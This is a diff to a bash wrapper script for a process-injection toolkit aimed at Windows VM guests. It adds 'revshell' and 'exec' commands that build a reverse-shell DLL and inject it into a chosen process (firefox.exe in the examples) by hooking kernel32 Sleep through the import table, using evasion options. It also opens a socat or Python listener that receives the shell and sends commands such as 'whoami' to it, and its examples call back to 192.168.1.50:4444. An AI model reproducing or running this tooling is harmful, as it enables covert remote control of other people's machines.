@@ -6,6 +6,7 @@ STAGE="${DECANT_STAGE:-$ROOT/target/decant-run}"
 LIVE_DIR="${DECANT_LIVE_DIR:-$HOME/Downloads/decant-live}"
 ENDPOINT="${DECANT_ENDPOINT:-127.0.0.1:7878}"
 WIN_TARGET="x86_64-pc-windows-gnu"
+STUB_MAGIC="44 45 43 41 4e 54 3a 3a 53 54 55 42 30 30 30 34"
 
 usage() {
   cat <<'EOF'
@@ -15,7 +16,10 @@ Usage:
   scripts/decant.sh build
   scripts/decant.sh daemon [--connector kvm|qemu] [--vm NAME] [--args ARG]
   scripts/decant.sh wine-run [--method METHOD|--config TOML] TARGET.exe [args...]
+  scripts/decant.sh orpheus <build|install|connect> [options]
   scripts/decant.sh guest-inject [options]
+  scripts/decant.sh revshell [HOST] [PORT] [PROCESS] [HOOK_MODULE] [HOOK_FN] [IAT_SLOTS]
+  scripts/decant.sh exec 'COMMAND' [HOST] [PORT] [PROCESS]
   scripts/decant.sh guest-unmap --config TOML
   scripts/decant.sh cli decant-cli-args...
 
@@ -24,11 +28,17 @@ Test and fixture harnesses live in scripts/decant-test.sh.
 Examples:
   scripts/decant.sh wine-run --method standard "$HOME/.wine/drive_c/Program Files/Cheat Engine/Cheat Engine.exe"
   scripts/decant.sh wine-run --method manual-map ./target/x86_64-pc-windows-gnu/debug/sample-tool.exe --inject-test
+  scripts/decant.sh orpheus install
+  scripts/decant.sh orpheus connect
   MEMFLOW_PLUGIN_PATH=/opt/memflow scripts/decant.sh daemon --connector qemu --vm win10
   MEMFLOW_PLUGIN_PATH=/opt/memflow scripts/decant.sh daemon --connector kvm --vm win10
-  scripts/decant.sh guest-inject --pid 7800 --payload ./payload.dll --stage-base 0x1400013b0 --result-base 0x140022000
+  scripts/decant.sh guest-inject --pid 7800 --payload ./payload.dll --stage-base 0x1400013b0 --result-base 0x140022000 --iat-stage-pool-slots 1024
   scripts/decant.sh guest-inject --pid 7800 --payload ./payload.dll --final-protections section --loader-metadata best-effort --call-stack registered-unwind --permission-transitions write-through-final --thread-starts require-module-backed --image-backing sec-image
   scripts/decant.sh guest-inject --pid 7800 --payload ./managed.dll --clr-assembly 'C:\\payloads\\managed.dll' --clr-class Example.Entry --clr-method Run --clr-argument '{}'
+  scripts/decant.sh revshell 192.168.1.50 4444
+  scripts/decant.sh revshell 192.168.1.50 4444 firefox.exe KERNEL32.dll Sleep
+  scripts/decant.sh exec 'whoami' 192.168.1.50 4444
+  scripts/decant.sh exec 'ipconfig /all' 192.168.1.50 4444 firefox.exe
   scripts/decant.sh guest-unmap --config ./target/decant-run/guest-inject.toml
 
 Environment:
@@ -235,7 +245,7 @@ wine_run() {
 }
 
 guest_config() {
-  local config="$1" target_line="$2" payload="$3" stage="" result="" hook_module="$4" hook_function="$5" timeout="$6" dependency_policy="$9" loader_metadata="${10}" final_protections="${11}" call_stack="${12}" permission_transitions="${13}" thread_starts="${14}" image_backing="${15}" base_address="${16}" header_wipe="${17}" loader_entries="${18}" stack_shaping="${19}" cleanup="${20}" execution_method="${21}" vad_spoof="${22}" target_module="${23}" delay_loads="${24}" sxs="${25}" force_remap="${26}" high_memory="${27}" is_dependency="${28}" manual_module_registry="${29}" reserved_hex="${30}" map_callback_path="${31}" clr_assembly="${32}" clr_class="${33}" clr_method="${34}" clr_argument="${35}" clr_net_version="${36}"
+  local config="$1" target_line="$2" payload="$3" stage="" result="" hook_module="$4" hook_function="$5" timeout="$6" dependency_policy="$9" loader_metadata="${10}" final_protections="${11}" call_stack="${12}" permission_transitions="${13}" thread_starts="${14}" image_backing="${15}" base_address="${16}" header_wipe="${17}" loader_entries="${18}" stack_shaping="${19}" cleanup="${20}" execution_method="${21}" vad_spoof="${22}" target_module="${23}" delay_loads="${24}" sxs="${25}" force_remap="${26}" high_memory="${27}" is_dependency="${28}" manual_module_registry="${29}" reserved_hex="${30}" map_callback_path="${31}" clr_assembly="${32}" clr_class="${33}" clr_method="${34}" clr_argument="${35}" clr_net_version="${36}" iat_stage_pool_slots="${37}"
   stage="$7"
   result="$8"
   local target_module_line="" reserved_line="" callback_line="" clr_block=""
@@ -295,6 +305,7 @@ force_remap = $force_remap
 high_memory = $high_memory
 is_dependency = $is_dependency
 manual_module_registry = "$manual_module_registry"
+iat_stage_pool_slots = $iat_stage_pool_slots
 hook_module = "$(toml_escape "$hook_module")"
 hook_function = "$(toml_escape "$hook_function")"
 $stage$result$reserved_line$callback_line
@@ -317,6 +328,7 @@ guest_inject() {
   local vad_spoof="off"
   local target_module="" delay_loads="resolve" sxs="skip"
   local force_remap="false" high_memory="false" is_dependency="false" manual_module_registry="off"
+  local iat_stage_pool_slots="1024"
   local reserved_hex="" map_callback_path=""
   local clr_assembly="" clr_class="" clr_method="" clr_argument="" clr_net_version=""
   while [[ $# -gt 0 ]]; do
@@ -330,6 +342,7 @@ guest_inject() {
       --stage-pattern) stage="stage_pattern = \"$(toml_escape "$2")\""$'\n'; shift 2 ;;
       --result-base) result="result_base = $2"$'\n'; shift 2 ;;
       --result-pattern) result="result_pattern = \"$(toml_escape "$2")\""$'\n'; shift 2 ;;
+      --iat-stage-pool-slots) iat_stage_pool_slots="$2"; shift 2 ;;
       --hook-module) hook_module="$2"; shift 2 ;;
       --hook-function) hook_function="$2"; shift 2 ;;
       --dependency-policy) dependency_policy="$2"; shift 2 ;;
@@ -384,7 +397,7 @@ guest_inject() {
       exit 2
     fi
     config="$STAGE/guest-inject.toml"
-    guest_config "$config" "$target_line" "$payload" "$hook_module" "$hook_function" "$timeout" "$stage" "$result" "$dependency_policy" "$loader_metadata" "$final_protections" "$call_stack" "$permission_transitions" "$thread_starts" "$image_backing" "$base_address" "$header_wipe" "$loader_entries" "$stack_shaping" "$cleanup" "$execution_method" "$vad_spoof" "$target_module" "$delay_loads" "$sxs" "$force_remap" "$high_memory" "$is_dependency" "$manual_module_registry" "$reserved_hex" "$map_callback_path" "$clr_assembly" "$clr_class" "$clr_method" "$clr_argument" "$clr_net_version"
+    guest_config "$config" "$target_line" "$payload" "$hook_module" "$hook_function" "$timeout" "$stage" "$result" "$dependency_policy" "$loader_metadata" "$final_protections" "$call_stack" "$permission_transitions" "$thread_starts" "$image_backing" "$base_address" "$header_wipe" "$loader_entries" "$stack_shaping" "$cleanup" "$execution_method" "$vad_spoof" "$target_module" "$delay_loads" "$sxs" "$force_remap" "$high_memory" "$is_dependency" "$manual_module_registry" "$reserved_hex" "$map_callback_path" "$clr_assembly" "$clr_class" "$clr_method" "$clr_argument" "$clr_net_version" "$iat_stage_pool_slots"
   fi
   "$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" --json guest-inject "$config"
 }
@@ -408,6 +421,121 @@ guest_unmap() {
   "$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" --json guest-unmap "$config"
 }
 
+revshell() {
+  local host="${1:-127.0.0.1}"
+  local port="${2:-4444}"
+  local process_name="${3:-guest-inject-target.exe}"
+  local hook_module="${4:-kernel32.dll}"
+  local hook_function="${5:-Sleep}"
+  local iat_slots="${6:-4}"
+
+  cargo run -p xtask -- revshell "$host" "$port" >&2
+  cp "$ROOT/target/$WIN_TARGET/debug/revshell.dll" "$STAGE/revshell.dll"
+
+  local pid base stage result
+  local stage_args="" result_args=""
+  pid="$("$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" processes |
+    awk -v n="$process_name" '$2 == n {print $1; exit}')"
+  if [[ -z "$pid" ]]; then
+    echo "revshell: target process '$process_name' not found" >&2
+    return 1
+  fi
+  base="$("$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" modules "$pid" |
+    awk -v n="$process_name" '$3 == n {print $1; exit}')"
+  stage="$("$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" scan "$pid" "$STUB_MAGIC" |
+    awk '/^0x/{print $1; exit}')"
+  if [[ -n "$stage" ]]; then
+    stage_args="stage_base = $stage"$'\n'
+    result="$(printf '0x%x' "$(( base + 0x22000 ))")"
+    result_args="result_base = $result"$'\n'
+  fi
+
+  local cfg="$STAGE/revshell-inject.toml"
+  guest_config "$cfg" "pid = $pid" "$STAGE/revshell.dll" \
+    "$hook_module" "$hook_function" "120000" \
+    "$stage_args" "$result_args" \
+    "require-loaded" "best-effort" "section" "native" "standard" \
+    "existing-thread" "private" "preferred" "none" "absent" "native" \
+    "resident" "iat-hook" "off" "" "resolve" "skip" "true" "false" "false" \
+    "off" "" "" "" "" "" "" "" "$iat_slots"
+
+  socat TCP-LISTEN:"$port",reuseaddr - &
+  local listener_pid=$!
+  DECANT_SKIP_BUILD=1 "$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" guest-inject "$cfg" >/dev/null 2>&1
+  wait "$listener_pid"
+}
+
+exec_cmd() {
+  local command="$1"
+  local host="${2:-127.0.0.1}"
+  local port="${3:-4445}"
+  local process_name="${4:-guest-inject-target.exe}"
+
+  cargo run -p xtask -- revshell "$host" "$port" >&2
+  cp "$ROOT/target/$WIN_TARGET/debug/revshell.dll" "$STAGE/revshell.dll"
+
+  local pid base stage result
+  local stage_args="" result_args=""
+  pid="$("$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" processes |
+    awk -v n="$process_name" '$2 == n {print $1; exit}')"
+  if [[ -z "$pid" ]]; then
+    echo "exec: target process '$process_name' not found" >&2
+    return 1
+  fi
+  base="$("$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" modules "$pid" |
+    awk -v n="$process_name" '$3 == n {print $1; exit}')"
+  stage="$("$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" scan "$pid" "$STUB_MAGIC" |
+    awk '/^0x/{print $1; exit}')"
+  if [[ -n "$stage" ]]; then
+    stage_args="stage_base = $stage"$'\n'
+    result="$(printf '0x%x' "$(( base + 0x22000 ))")"
+    result_args="result_base = $result"$'\n'
+  fi
+
+  local cfg="$STAGE/revshell-exec.toml"
+  guest_config "$cfg" "pid = $pid" "$STAGE/revshell.dll" \
+    "kernel32.dll" "Sleep" "15000" \
+    "$stage_args" "$result_args" \
+    "require-loaded" "best-effort" "section" "native" "standard" \
+    "existing-thread" "private" "preferred" "none" "absent" "native" \
+    "resident" "iat-hook" "off" "" "resolve" "skip" "true" "false" "false" \
+    "off" "" "" "" "" "" "" "" "4"
+
+  python3 -c "
+import socket, time, sys
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('0.0.0.0', $port))
+s.listen(1)
+s.settimeout(30)
+try:
+    conn, addr = s.accept()
+    conn.settimeout(5)
+    time.sleep(2)
+    conn.sendall(('$command' + '\r\n').encode())
+    time.sleep(3)
+    out = b''
+    try:
+        while True:
+            chunk = conn.recv(4096)
+            if not chunk: break
+            out += chunk
+    except socket.timeout:
+        pass
+    sys.stdout.buffer.write(out)
+    sys.stdout.flush()
+    conn.close()
+except socket.timeout:
+    print('no connection received', file=sys.stderr)
+finally:
+    s.close()
+" &
+  local listener_pid=$!
+  sleep 1
+  DECANT_SKIP_BUILD=1 "$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" guest-inject "$cfg" >/dev/null 2>&1
+  wait "$listener_pid"
+}
+
 cmd="${1:-help}"
 if [[ $# -gt 0 ]]; then
   shift
@@ -418,7 +546,10 @@ case "$cmd" in
   build) build_all ;;
   daemon) daemon_cmd "$@" ;;
   wine-run) wine_run "$@" ;;
+  orpheus) "$ROOT/scripts/orpheus.sh" "$@" ;;
   guest-inject) guest_inject "$@" ;;
+  revshell) revshell "$@" ;;
+  exec) exec_cmd "$@" ;;
   guest-unmap) guest_unmap "$@" ;;
   cli) build_host; "$LIVE_DIR/decant-cli" --endpoint "$ENDPOINT" "$@" ;;
   *) echo "unknown command: $cmd" >&2; usage >&2; exit 2 ;;
